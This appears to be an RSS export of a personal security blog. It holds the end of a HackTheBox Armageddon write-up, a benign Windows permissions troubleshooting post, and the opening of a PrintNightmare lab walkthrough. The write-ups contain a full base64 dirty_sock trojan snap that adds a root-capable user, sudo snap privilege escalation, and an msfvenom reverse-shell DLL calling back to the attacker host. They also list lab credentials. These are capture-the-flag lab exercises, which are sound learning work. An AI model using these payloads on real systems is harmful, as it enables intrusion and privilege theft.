Time.Estimated...: Tue Mar 30 12:04:00 2021 (0 secs)
...[SNIP]...
</code></pre><h4 id="ssh---brucetherealadmin">SSH - brucetherealadmin</h4>
<p>The password <code>booboo</code> works for <code>brucetherealadmin</code> and can be used on SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.4» 
$ ssh brucetherealadmin@10.129.90.96
brucetherealadmin@10.10.10.233<span class="err">&#39;</span>s password:
Last login: Tue Mar <span class="m">23</span> 12:40:36 <span class="m">2021</span> from 10.10.14.2
<span class="o">[</span>brucetherealadmin@armageddon ~<span class="o">]</span>$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</code></pre></div><p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <code>brucetherealadmin</code> is allowed to run  <code>/usr/bin/snap install</code> as root user. I could leverage this rights to install a malicious snap package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon ~<span class="o">]</span>$ sudo -l
Matching Defaults entries <span class="k">for</span> brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;MAIL
</span><span class="s2">    PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_MONETARY LC_NAME LC_NUMERIC
</span><span class="s2">    LC_PAPER LC_TELEPHONE&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>, <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/snap install *
</code></pre></div><h4 id="malicious-snap-package">Malicious Snap Package</h4>
<p>After googling around, I found <a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">this blog</a> by <a href="https://twitter.com/init_string">Chris Moberly</a> about Dirty Sock vulnerability in Snap version &lt; 2.37. The author created two PoC exploits for this vulnerability:</p>
<ul>
<li>
<p><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py">dirty_sockv1</a>: Uses the ‘create-user’ API to create a local user based on details queried from the Ubuntu SSO.</p>
</li>
<li>
<p><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">dirty_sockv2</a>: Sideloads a snap that contains an install-hook that generates a new local user.</p>
</li>
</ul>
<p>The current snap version is not vulnerable (<a href="https://github.com/snapcore/snapd/commit/ce458d69bf0f336a34fb552be89c68071c683049#diff-2c0c2e43fe96e84eb5935d499907cd6c263fb806c165b723d638118344962484">patched with regex</a>) to Dirty Sock. But, since the goal here is to install a malicious snap package with administrative privilege, I can steal the payload (trojan snap code) from the PoC exploit v2 and revert it back to a snap package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ snap version
snap    2.47.1-1.el7
snapd   2.47.1-1.el7
series  <span class="m">16</span>
centos  <span class="m">7</span>
kernel  3.10.0-1160.6.1.el7.x86_64
</code></pre></div><p>First, I will grab the v2 exploit and transfer it to Armageddon</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploit» «10.10.14.4» 
$ wget https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py
→ kali@kali «exploit» «10.10.14.4» 
$ scp dirty_sockv2.py brucetherealadmin@10.129.92.110:/dev/shm
brucetherealadmin@10.129.92.110<span class="err">&#39;</span>s password: 
dirty_sockv2.py                                       100% <span class="m">8696</span>     8.5KB/s   00:01    
</code></pre></div><p>I will pull out the payload from the exploit and revert it back to a snap package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ python3 -c <span class="s2">&#34;print(&#39;&#39;&#39;
</span><span class="s2">&gt; aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
</span><span class="s2">&gt; /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
</span><span class="s2">&gt; ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
</span><span class="s2">&gt; TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
</span><span class="s2">&gt; T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
</span><span class="s2">&gt; Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
</span><span class="s2">&gt; ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
</span><span class="s2">&gt; ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
</span><span class="s2">&gt; L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
</span><span class="s2">&gt; b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
</span><span class="s2">&gt; rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
</span><span class="s2">&gt; rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
</span><span class="s2">&gt; AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
</span><span class="s2">&gt; XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
</span><span class="s2">&gt; RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
</span><span class="s2">&gt; AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#39;&#39;&#39;+ &#39;A&#39; * 4256 + &#39;==&#39;)&#34;</span> <span class="p">|</span> base64 -d &gt; malicious.snap
<span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ file malicious.snap
file malicious.snap
malicious.snap: Squashfs filesystem, little endian, version 4.0, <span class="m">910</span> bytes, <span class="m">7</span> inodes, blocksize: <span class="m">131072</span> bytes, created: Sat Feb  <span class="m">2</span> 23:00:32 <span class="m">2019</span>
</code></pre></div><h4 id="install-malicious-package">Install Malicious Package</h4>
<p>The <code>malicious.snap</code> file now can be installed with  <code>--devmode</code> option to skip digital signatures check. If the exploit success, there will be a new user added called <code>dirty_sock</code>  (default from the payload).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ sudo /usr/bin/snap install --devmode malicious.snap 
dirty-sock 0.1 installed
</code></pre></div><p>And the user is there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
</code></pre></div><h4 id="su---root">su - root</h4>
<p>Now I can switch user to <code>dirty_sock</code> using a password of <code>dirty_sock</code> and run <code>sudo su</code> to obtain a root shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ su dirty_sock
Password: 
<span class="o">[</span>dirty_sock@armageddon shm<span class="o">]</span>$ sudo su

We trust you have received the usual lecture from the <span class="nb">local</span> System
Administrator. It usually boils down to these three things:

    <span class="c1">#1) Respect the privacy of others.</span>
    <span class="c1">#2) Think before you type.</span>
    <span class="c1">#3) With great power comes great responsibility.</span>

<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> dirty_sock: 
<span class="o">[</span>root@armageddon shm<span class="o">]</span><span class="c1"># ifconfig</span>
ens192: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>
        inet 10.129.92.110  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::7edc:a185:87bc:5935  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
        inet6 fe80::7648:5ea1:5371:b3b5  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
        inet6 fe80::ef75:a96e:3c27:e78b  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
        ether 00:50:56:b9:41:c7  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets <span class="m">9191</span>  bytes <span class="m">732392</span> <span class="o">(</span>715.2 KiB<span class="o">)</span>
        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
        TX packets <span class="m">1149</span>  bytes <span class="m">188885</span> <span class="o">(</span>184.4 KiB<span class="o">)</span>
        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Windows 10 Troubleshoot: Permissions</title>
      <link>https://fahmifj.github.io/blog/windows-10-troubleshoot-permissions/</link>
      <pubDate>Wed, 21 Jul 2021 07:07:50 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/windows-10-troubleshoot-permissions/</guid>
      <description>Facing weird error on Windows 10? Then maybe this post could help you</description>
      <content:encoded><![CDATA[<p>Yesterday, I wanted to upgrade my Microsoft Office, and then planned to clean up my Windows laptop from unused programs, particularly the ones installed by chocolatey (Windows package manager). But, you guess it, things don&rsquo;t always go as planned.</p>
<p>The first problem I encounter was <code>Error Code: 30015-4 (5)</code>, while trying to re-install my Microsoft Office, and then several  <code>C:\ProgramData\Microsoft\Windows GetLastError:5</code> error messages. These problems were related to Windows permissions, and I believe they were caused by a Microsoft troubleshooter tool called <a href="https://www.microsoft.com/en-us/download/100607">SaRA</a>. The tool might have accidentally messed up the Windows permissions during the process of cleaning up my previous Microsoft Office. As a result, my Windows no longer be able to install or remove some apps.</p>
<p>But, I was able to resolve these problems by manually resetting the permissions of the respective app folders back to their original state. So, I think it would be fun to post how I resolve them.</p>
<h2 id="the-problems">The Problems</h2>
<p>The first problem I ran into was <code>Error Code: 30015-4(5)</code> when I tried to reinstall my Microsoft Office.</p>
<p><img class="img-container" src="imgs/image-20210721040950497.png" alt="image-20210721040950497"  title="Error Code: 30015-4 (5)"  />
</p>
<p>I clicked on the online help, and it was pointing out to <a href="https://support.microsoft.com/en-us/office/fix-office-installation-errors-d5df89a9-0507-4b4c-92f9-22f457e630aa?ns=ocsac2rinstall&amp;version=16&amp;syslcid=1033&amp;uilcid=1033&amp;appver=cin160&amp;helpid=%225-4-30015%22&amp;ui=en-us&amp;rs=en-us&amp;ad=us">this page</a>. At the bottom of the page, it offers an &ldquo;easy fix&rdquo; tool to resolve the problem above.</p>
<p><img class="img-container" src="imgs/image-20210721041358098.png" alt="image-20210721041358098"  title="An easy fix tool that resulted in another chaos"  />
</p>
<p>I downloaded and ran that tool, but the error remains 🙃.</p>
<p>At this point, I couldn&rsquo;t install or uninstall any applications wrapped with Windows Installer (<code>.msi</code>) anymore, including NodeJS. It&rsquo;s the same problem as the one in my <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">PrintNightmare</a> post, in which my Visual Studio refuses to install the Windows SDK.</p>
<p><img class="img-container" src="./imgs/image-20210718024015408.png" alt="image-20210718024015408"  />
</p>
<p>And somehow, this also affects my laptop&rsquo;s WiFi functionality/features, such as:</p>
<ul>
<li>Unable to save WiFi profiles, auto-connect no longer works.</li>
<li>Unable to turn on the mobile hotspot feature</li>
<li>The &ldquo;Forget&rdquo; and &ldquo;Properties&rdquo; options are missing when a right-click is performed on a WiFi connection.</li>
</ul>
<p>The most weird one is a stack-based buffer error came from my WiFi settings.</p>
<p><img class="img-container" src="imgs/image-20210721050915867.png" alt="image-20210721050915867"  title="Stack-based buffer error"  />
</p>
<p>The error raises when I clicked any Wi-Fi connection that currently in use from the Wi-Fi settings.</p>
<p><img class="img-container" src="imgs/image-20210721053820002.png" alt="image-20210721053820002"  title="WiFi Settings"  />
</p>
<p>Also, the &ldquo;Forget&rdquo; and &ldquo;Properties&rdquo; options were missing. I found the same issue <a href="https://answers.microsoft.com/en-us/windows/forum/all/windows-10-doesnt-save-wifi-network-resolved/16ae1129-e24b-4268-91c4-acc4446966fa">here</a> but the solution doesn&rsquo;t suite my environment.</p>
<p><img class="img-container" src="imgs/image-20210721054401662.png" alt="image-20210721054401662"  title="Missing the Forget and the Properties options"  />
</p>
<h2 id="finding-the-root-cause">Finding The Root Cause</h2>
<p>Searching for <code>Error Code: 30015-4  (5)</code> on the Microsoft Support site didn&rsquo;t really help, so I started to search for the official documentation about error code, and I found <a href="https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-">this page</a>. I couldn&rsquo;t find anything about &ldquo;30015-4&rdquo; in that page, but I think I did know what &ldquo;(5)&rdquo; meant.</p>
<p><img class="img-container" src="imgs/image-20210721043547662.png" alt="image-20210721043547662"  />
</p>
<p>At this point, it was clear that these problems were related to the system permissions (even my Wi-Fi problem).</p>
<p>I started to investigate <code>C:\Program Files\</code> and <code>C:\Program Files (x86)\</code> (the default folder for installed apps), but no problems were found there.  So the next one is <code>C:\ProgramData</code>, where all application data is stored/created.</p>
<p>While investigating all the folders under <code>C:\ProgramData\</code> and <code>C:\ProgramData\Microsoft</code>, I noticed that some of the folders only have my account listed in their security properties.</p>
<p><img class="img-container" src="imgs/image-20210721044802348.png" alt="image-20210721044802348"  title="Bad Permissions on Office folder"  />
</p>
<p>Normally, the folder permissions under <code>C:\ProgramData</code> should be configured similar to the image below (taken from VirtualBox folder) .</p>
<p><img class="img-container" src="imgs/image-20210721045334784.png" alt="image-20210721045334784"  title="Good Permissions: Basic"  />
</p>
<p>And here are the advanced permission settings.</p>
<p><img class="img-container" src="imgs/image-20210721045624596.png" alt="image-20210721045624596"  title="Good Permissions: Advanced Settings"  />
</p>
<p>Now I know how the default permissions look like, and I can use this as a template to fix the other folders with bad permissions.</p>
<h2 id="fix-the-problems">Fix The Problems</h2>
<h3 id="office-error-code-30015-4-5">Office Error Code: 30015-4 (5)</h3>
<p>This error <code>Error Code: 30015-4 (5)</code> can be resolved by enabling the inheritance on the respective app folder, which is <code>C:\ProgramData\Microsoft\OFFICE</code>. So that the permissions of the  <code>Microsoft</code> folder will be inherited to the <code>OFFICE</code> folder. I will also remove my account, &ldquo;Fahmi FJ&rdquo;, from the permission entries.</p>
<p><img class="img-container" src="imgs/image-20210721051824838.png" alt="image-20210721051824838"  title="Fix Office Error Code: 30015-4(5)"  />
</p>
<p>If you&rsquo;re not sure about this, do check the other folders' permission under the same parent folder. Using this case, then the parent folder is <code>C:\ProgramData\Microsoft\</code>,  and the child is other folders under <code>C:\ProgramData\Microsoft\[child]</code>.</p>
<p>I got my Ms Office back now.</p>
<p><img class="img-container" src="imgs/image-20210721053920106.png" alt="image-20210721053920106"  />
</p>
<h3 id="getlasterror5">GetLastError:5</h3>
<p>Any <code>GetLastError:5</code>, can be resolved using the same method as above, by enabling the inheritance to of the affected application folder.</p>
<p>In my case, I got the following error message from chocolatey and node.js:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms GetLastError: <span class="m">5</span>
</code></pre></div><p>Then, first, I should look into the permissions of <code>Microsoft</code> folder, then <code>Windows</code> folder, and then <code>Start Menu</code> folder, and it turned out the problem is in the <code>Windows</code> folder permissions. So, to resolve this problem, I have to inherit the <code>Microsoft</code> folder permissions to the <code>Windows</code> folder, see image below.</p>
<p><img class="img-container" src="imgs/image-20210721114505028.png" alt="image-20210721114505028"  />
</p>
<p>And then, I will revert the <code>Start Menu</code> folder permissions to default, see image below.</p>
<p><img class="img-container" src="imgs/image-20210721114911619.png" alt="image-20210721114911619"  />
</p>
<p>Finally inherit the <code>Start Menu</code> folder permissions to the <code>Programs</code> folder.</p>
<p><img class="img-container" src="imgs/image-20210721115022365.png" alt="image-20210721115022365"  />
</p>
<p>Again, if you&rsquo;re not sure about this, and didn&rsquo;t want to reinstall your Windows, try install a fresh Windows on Virtual Machine / Cloud and inspect the default permission settings.</p>
<h3 id="stack-based-and-wifi-error">Stack-based and WiFi error</h3>
<p>This section may resolve the following problems.</p>
<ul>
<li>SystemSettings.exe - System Error: The system detected an overrun of a blabla..</li>
<li>Windows won&rsquo;t remember Wi-Fi password</li>
<li>The &ldquo;Forget&rdquo; and &ldquo;Properties&rdquo; options are missing from Wi-Fi connection.</li>
<li>Mobile Hotspot Wi-Fi</li>
</ul>
<p>In my case the root cause of these problems was also the folder permission.</p>
<p>In Windows, all Wi-Fi profiles are stored in <code>C:\ProgramData\Microsoft\Wlansvc\Profiles</code>, so if the permissions are messed up, the system is most likely to crash or partially working. In my case, my laptop is able to connect to any Wi-Fi network, but it can&rsquo;t remember the Wi-Fi profile, so I have to re-enter my Wi-Fi password every time I want to connect.</p>
<p>But, after reverting the <code>Wlansvc</code> folder permissions, the WiFi functionality/features back to normal.</p>
<p><img class="img-container" src="imgs/image-20210721055011183.png" alt="image-20210721055011183"  />
</p>
<p>It also fixed the missing options and auto-connect.</p>
<p><img class="img-container" src="imgs/image-20210721055107535.png" alt="image-20210721055107535"  />
</p>
<p>Also, there is no more error about &ldquo;<em>The system detected an overrun of a stack-based buffer in this  application. This overrun could potentially allow a malicious user to  gain control of this application</em>&rdquo; on the Wi-Fi settings.</p>
<blockquote>
<p>Padahal cuma mau reinstall Office, merembetnya kemana-mana 🙃.</p>
</blockquote>
<h2 id="conclusion">Conclusion</h2>
<p>That&rsquo;s all! I hope this post helps you too.</p>
<p>I will try to keep this post updated whenever I face the same problem related to Windows Permissions.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--1700-3999-">https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--1700-3999-</a></li>
<li>Myself</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Play with PrintNightmare using HackTheBox machines</title>
      <link>https://fahmifj.github.io/blog/play-with-printnightmare/</link>
      <pubDate>Sat, 17 Jul 2021 13:52:01 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/play-with-printnightmare/</guid>
      <description>Having fun with a Zero-Day vulnerability</description>
      <content:encoded><![CDATA[<p>For the past week, a lot of InfoSec pros I follow on Twitter were <em>tweeting</em> about a remote code execution vulnerability in the Windows Print  Spooler service that could be used for privilege escalation, and, furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to this vulnerability, which is now publicly known as PrintNightmare.  This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Windows Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.</p>
<p>I’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability, but in this post, I would like to play with the vulnerability using <a href="http://hackthebox.eu/">HackTheBox</a> <a href="https://www.hackthebox.eu/newsroom/htb-take-it-easy-july-2021">retired machines</a> as targets.</p>
<p><strong>[Updated 03-03-2021]</strong></p>
<ul>
<li>Update clarity</li>
</ul>
<h2 id="target-machines">Target Machines</h2>
<p>The following are the retired Windows machines from HackTheBox along with a low privilege user that I will use to play with PrintNightmare.</p>
<div class="table-wrapper" >
<table>
<thead>
<tr>
<th style="text-align:center">Target</th>
<th style="text-align:center">IP</th>
<th style="text-align:center">Low Priv Credentials [username:password]</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Active</td>
<td style="text-align:center">10.10.10.100</td>
<td style="text-align:center">svc_tgs:GPPstillStandingStrong2k18</td>
</tr>
<tr>
<td style="text-align:center">Bastion</td>
<td style="text-align:center">10.10.10.134</td>
<td style="text-align:center">l4mpje:bureaulampje</td>
</tr>
<tr>
<td style="text-align:center">Heist</td>
<td style="text-align:center">10.10.10.149</td>
<td style="text-align:center">hazard:stealth1agent</td>
</tr>
<tr>
<td style="text-align:center">Forest</td>
<td style="text-align:center">10.10.10.161</td>
<td style="text-align:center">svc-alfresco:s3rvice</td>
</tr>
<tr>
<td style="text-align:center">Atom</td>
<td style="text-align:center">10.10.10.237</td>
<td style="text-align:center">jason:kidvscat_electron_@123</td>
</tr>
</tbody>
</table>
</div>
<h2 id="preparation">Preparation</h2>
<p>There are several exploit PoC for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>. To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0.</p>
<p>But, changing the currently installed Impacket could potentially mess up my Kali. Therefore, I will use a Python virtual environment using <code>virtualenv</code> module. If I don&rsquo;t have it, I can run the following command to install the module.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ python3 -m pip install virtualenv
</code></pre></div><p>The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba server, and it must be configured to allow anonymous access, so that the exploit can directly grab the DLL .</p>
<p>That&rsquo;s being said, I will do some preparation.</p>
<h3 id="working-directory">Working Directory</h3>
<p>The first one is a working directory/folder, which I will create one in <code>/opt</code> called <code>printnightmare</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «opt» «10.10.14.75» 
$ mkdir printnightmare <span class="o">&amp;&amp;</span> <span class="nb">cd</span> printnightmare
</code></pre></div><p>Inside the <code>printnightmare</code> , I will clone the cube0x0 impacket as well as the exploit (<code>CVE-2021-1675-cube0x0</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ git clone https://github.com/cube0x0/impacket <span class="o">&amp;&amp;</span> git clone https://github.com/cube0x0/CVE-2021-1675.git CVE-2021-1675-cube0x0
</code></pre></div><p>Next, I will create a virtual environment called  <code>impacket-venv</code> using <code>virtualenv</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ virtualenv impacket-venv
created virtual environment CPython3.9.2.final.0-64 in 614ms
  creator CPython3Posix<span class="o">(</span><span class="nv">dest</span><span class="o">=</span>/opt/printnightmare/impacket-venv, <span class="nv">clear</span><span class="o">=</span>False, <span class="nv">no_vcs_ignore</span><span class="o">=</span>False, <span class="nv">global</span><span class="o">=</span>False<span class="o">)</span>
  seeder FromAppData<span class="o">(</span><span class="nv">download</span><span class="o">=</span>False, <span class="nv">pip</span><span class="o">=</span>bundle, <span class="nv">setuptools</span><span class="o">=</span>bundle, <span class="nv">wheel</span><span class="o">=</span>bundle, <span class="nv">via</span><span class="o">=</span>copy, <span class="nv">app_data_dir</span><span class="o">=</span>/home/kali/.local/share/virtualenv<span class="o">)</span>
    added seed packages: <span class="nv">pip</span><span class="o">==</span>21.1.3, <span class="nv">setuptools</span><span class="o">==</span>57.1.0, <span class="nv">wheel</span><span class="o">==</span>0.36.2
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
</code></pre></div><p>Then, I will activate the virtual environment with the following commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
$ <span class="nb">source</span> impacket-venv/bin/activate
</code></pre></div><p>Now I can just install the cube0x0 impacket.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ <span class="nb">cd</span> impacket <span class="o">&amp;&amp;</span> python3 setup.py install
running install
running bdist_egg
running egg_info
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h3 id="generate-malicious-dll">Generate Malicious DLL</h3>
<p>The next step is generating a DLL payload.</p>
<p>Under the <code>printnightmare</code> folder, I will create a <code>dll</code> folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ mkdir dll
</code></pre></div><p>I could generate the DLL with help of <code>msfvenom</code> . Upon a successful exploitation, this DLL will connects back to my attacking machine on port 4444, in short, it&rsquo;s a reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «dll» «10.10.14.75» 
$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.75 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; revshell.dll  
<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span class="m">460</span> bytes
Final size of dll file: <span class="m">8704</span> bytes
</code></pre></div><p>The DLL generated under <code>/opt/printnightmare/dll/[here]</code>.</p>
<blockquote>
<p>If you want to compile your own, go <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">here</a> or see <a href="https://fahmifj.github.io/blog/play-with-printnightmare/#troubleshoot">Troubleshoot</a></p>
</blockquote>
<h3 id="samba-configuration">Samba Configuration</h3>
<p>In the exploit repo, cube0x0 also provides a guide on how to configure a Samba server for hosting the DLL payload. I will follow cube0x0&rsquo;s guide, but I will add some additional lines for logging to the configuration file.</p>
<p>First, I will create a backup of the original Samba configuration file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.bak<span class="o">}</span>
</code></pre></div><p>Then I will replace the entire <code>smb.conf</code> contents with the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[global]
   server role = standalone server
   smb ports = 445
   map to guest = bad user
   usershare allow guests = yes
   idmap config * : backend = tdb
   log file = /var/log/samba/log.%m
   max log size = 1000
   logging = file
   
[ef]
    comment = Samba
    path = /opt/printnightmare/dll
    guest ok = yes
    read only = no
    browsable = yes
</code></pre></div><p>Lastly, I will start the Samba service.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
$ sudo systemctl start smbd 
</code></pre></div><h2 id="target-scanning">Target Scanning</h2>
<p>According to <a href="https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html">this blog post</a> by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:</p>
<ol>
<li>Print Spooler Service enabled on the target system ❔</li>
<li>Network connectivity to the target system (initial access has been obtained)  ✔</li>
<li>Hash or password for a low privileged user (or computer) account  ✔</li>
</ol>
